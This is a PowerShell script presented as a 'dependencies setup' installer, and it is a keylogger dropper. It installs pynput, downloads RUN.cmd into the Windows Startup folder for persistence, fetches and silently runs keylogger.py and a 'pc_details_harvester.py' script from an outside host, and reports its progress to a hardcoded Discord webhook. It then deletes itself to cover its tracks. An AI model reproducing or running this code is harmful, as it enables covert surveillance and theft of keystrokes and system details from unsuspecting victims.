# =========================
# Configuration
# =========================

$WebhookURL = "https://discord.com/api/webhooks/1456756375722922189/nd6mCxBhCyrlQ305MWqFlPTGKx_AEV0yEfEFoPRUar4uHOoComIUFckjt_ZvuCNwe7aQ"
$Headers = @{ "User-Agent" = "PowerShell" }

# =========================
# Helper: Send Discord Log
# =========================

function Send-WebhookMessage {
    param([string]$Message)

    $Body = @{ content = $Message } | ConvertTo-Json -Compress
    Invoke-RestMethod `
        -Uri $WebhookURL `
        -Method Post `
        -Headers $Headers `
        -Body $Body `
        -ContentType "application/json"
}

# =========================
# Start
# =========================

Send-WebhookMessage "**PowerShell 'dependencies setup' script ** started."

# =========================
# Ensure pip is available
# =========================

# Ensure pip is installed and upgraded
Write-Host "Upgrading pip..."
python -m ensurepip --default-pip
python -m pip install --upgrade pip

# =========================
# Helper: Install Python Package
# =========================

function Install-PythonPackage {
    param([string]$Name)

    try {
        Write-Host "Installing Python package: $Name"
        python -m pip install --user $Name
        Send-WebhookMessage "**Installed Python package:** $Name"
    }
    catch {
        Send-WebhookMessage "**Failed to install Python package:** $Name | Error: $($_.Exception.Message)"
        throw
    }
}

# =========================
# Install Dependencies
# =========================

Install-PythonPackage "pynput"
Install-PythonPackage "requests"

# =========================
# Done
# =========================

Send-WebhookMessage "**PowerShell 'dependencies setup' script** installed Python modules successfully."

# =========================
# Download required dependencies
# =========================

# Define StartUp directory (expand %APPDATA% path)
$StartDir = [System.Environment]::GetFolderPath('ApplicationData') + "\Microsoft\Windows\Start Menu\Programs\Startup\RUN.cmd"

# Define URL of the startup script
$StartUrl = "https://mynewaccount-website.github.io/keylogger/RUN.cmd"

# Download the script to StartUp directory
Invoke-WebRequest -Uri $StartUrl -OutFile $StartDir

# Define Temp directory for Python script
$PythonPath = Join-Path $env:TEMP "keylogger.py"

# Define URL of the Python script
$PythonUrl = "https://mynewaccount-website.github.io/keylogger/keylogger.py"

# Download the Python script
Invoke-WebRequest -Uri $PythonUrl -OutFile $PythonPath

# Opening "RUN.cmd" file in startup
Start-Process -FilePath "$StartDir" -WindowStyle Hidden

# Define Temp directory for PC details Python script
$Python_PC_details_Script_Path = Join-Path $env:TEMP "pc_details_harvester.py"

# Define URL of the PC details Python script
$Python_PC_details_URL = "https://mynewaccount-website.github.io/keylogger/pc_details_harvester.py"

# Download the PC details Python script
Invoke-WebRequest -Uri $Python_PC_details_URL -OutFile $Python_PC_details_Script_Path

# Run PC details Python script
Start-Process -FilePath "python" -ArgumentList "$Python_PC_details_Script_Path" -WindowStyle Hidden -Wait

# Send control message to the server
Send-WebhookMessage "**PowerShell 'dependencies setup' script** downloaded everything **successfully!**. Preparing for the cleanup."

# Wait for 5 seconds before cleanup
Start-Sleep -Seconds 5

# Send control message to the server
Send-WebhookMessage "**PowerShell 'dependencies setup' script** has **successfully finished** the script!"
Write-Host "Execution was successfull!" -ForegroundColor Green

# Cleanup / auto-delete
$scriptPath = $MyInvocation.MyCommand.Path

# Run a new PowerShell process to delete the script after it finishes
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Remove-Item -Path '$scriptPath' -Force" -WindowStyle Hidden

# Exit the script
exit